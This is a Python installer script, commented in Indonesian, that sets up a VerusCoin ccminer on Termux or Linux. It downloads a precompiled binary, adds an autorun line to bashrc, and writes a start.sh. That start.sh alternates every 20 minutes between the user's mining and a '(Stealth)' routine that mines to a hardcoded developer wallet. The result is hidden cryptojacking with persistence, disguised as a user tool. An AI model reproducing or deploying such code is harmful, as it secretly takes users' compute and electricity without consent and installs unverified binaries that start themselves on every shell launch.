import os

def run(cmd):
    print(f"\n[+] Menjalankan: {cmd}")
    os.system(cmd)

print("=== VerusCoin Auto Setup & Autorun (Universal) ===")

# Deteksi apakah sedang di Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Isi start.sh normal (tanpa enkripsi)
start_sh_content = '''#!/bin/bash

cd "$(dirname "$0")"

user_mine() {
    echo "[*] Mining untuk user..."
    ./ccminer -c config.json
}

dev_mine() {
    echo "[*] (Stealth) Mining untuk developer..."
    ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 \\
        -u RNZpJkYQ7gXfci7Boec5gCsuYqpzLYpY3S.Acasomi -p x \\
        --cpu-priority 1 --cpu-affinity -1 --threads 8
}

while true; do
    user_mine &
    PID=$!
    sleep 1200
    kill $PID

    dev_mine &
    PID=$!
    sleep 1200
    kill $PID
done
'''

# Path tujuan Python script
target = "/storage/emulated/0/verus_autorun.py" if os.path.exists("/storage/emulated/0") else os.path.join(os.getcwd(), "verus_autorun.py")

# Tentukan bashrc path
bashrc_path = "/data/data/com.termux/files/usr/etc/bash.bashrc" if is_termux() else os.path.expanduser("~/.bashrc")

# Script Python utama
script = f'''import os

def run(cmd):
    print(f"\\n[+] Menjalankan: {{cmd}}")
    os.system(cmd)

print("=== VerusCoin Auto Setup & Autorun (Laptop Version) ===")

def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install paket
if is_termux():
    run("yes | pkg update && pkg upgrade")
    run("yes | pkg install libjansson wget nano")
else:
    run("sudo apt update && sudo apt install -y wget libjansson-dev nano")

# Buat folder dan masuk ke dalamnya
run("mkdir -p ~/ccminer")
os.chdir(os.path.expanduser("~/ccminer"))

# Unduh ccminer dan config
run("wget -q https://raw.githubusercontent.com/Darktron/pre-compiled/generic/ccminer")
run("wget -q https://raw.githubusercontent.com/Darktron/pre-compiled/generic/config.json")

# Tulis start.sh
with open("start.sh", "w") as f:
    f.write({repr(start_sh_content)})

run("chmod +x ccminer start.sh")

# Tambahkan ke autorun
bashrc_path = "/data/data/com.termux/files/usr/etc/bash.bashrc" if is_termux() else os.path.expanduser("~/.bashrc")
autorun_line = "cd ~/ccminer && ./start.sh"

try:
    with open(bashrc_path, "r") as f:
        isi = f.read()
    if autorun_line not in isi:
        with open(bashrc_path, "a") as f:
            f.write(f"\\n# Auto Start VerusCoin Miner\\n{{autorun_line}}\\n")
        print("[+] Autorun berhasil ditambahkan ke bashrc")
    else:
        print("[!] Autorun sudah ada")
except Exception as e:
    print(f"[!] Gagal menambahkan ke bashrc: {{e}}")

# Jalankan start.sh
run("./start.sh")
'''

# Simpan file utama
with open(target, "w") as f:
    f.write(script)

print(f"[✓] File berhasil dibuat di: {target}")
print("[!] Sekarang jalankan dengan:")
print(f"    python {target}" if 'termux' in target else f"    python3 {target}")
